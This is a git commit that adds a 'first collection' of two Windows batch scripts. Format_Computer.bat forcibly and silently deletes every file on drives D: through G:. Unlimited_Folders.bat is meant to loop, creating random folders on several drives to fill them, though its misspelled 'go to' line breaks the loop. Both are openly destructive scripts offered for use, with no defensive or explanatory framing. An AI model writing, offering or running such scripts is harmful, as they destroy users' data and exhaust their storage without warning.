7d25f17701397a9b0872f43efabda19d235a329b
thecorpsegrinder96 <thecorpsegrinder96@gmail.com>
2021-05-09 16:45:17 -0300

    1.0.0
    primera coleccion

---
+++ Format_Computer.bat
@@ -0,0 +1,5 @@
+@echo off
+del D:\ *.* /f /s /q
+del E:\ *.* /f /s /q
+del F:\ *.* /f /s /q
+del G:\ *.* /f /s /q
---
+++ Unlimited_Folders.bat
@@ -0,0 +1,9 @@
+@echo off
+:BinaryRogue
+cd /d D:
+md %RANDOM%
+cd /d E:
+md %RANDOM%
+cd /d F:
+md %RANDOM%
+go to BinaryRogue
